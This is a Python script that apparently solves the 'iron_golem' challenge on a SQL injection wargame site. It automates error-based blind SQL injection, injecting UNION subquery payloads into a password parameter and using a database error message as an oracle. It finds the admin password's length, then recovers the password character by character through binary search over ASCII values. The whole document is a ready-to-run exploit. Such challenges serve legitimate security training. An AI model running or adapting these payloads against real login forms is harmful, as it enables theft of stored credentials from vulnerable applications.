import requests

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookie = {'PHPSESSID': 'cookie'}

def find_length():
    pwlength = 1

    while True:
        param = {"pw": "' or id = 'admin' and (select 0 union select length(pw) = {}) #".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "Subquery returns more than 1 row" in req.text:
            return pwlength
        else:
            pwlength += 1

def find_pw():
    length = find_length()
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"pw": "' or id = 'admin' and (select 0 union select ascii(substring(pw, {}, 1)) = {}) #".format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "Subquery returns more than 1 row" in req.text:
                password += chr(value)
                break
            else:
                param = {"pw": "' or id = 'admin' and (select 0 union select ascii(substring(pw, {}, 1)) > {}) #".format(i+1, value)}
                req = requests.get(url, params = param, cookies = cookie)
                if "Subquery returns more than 1 row" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("비밀번호는: ", password)

find_pw()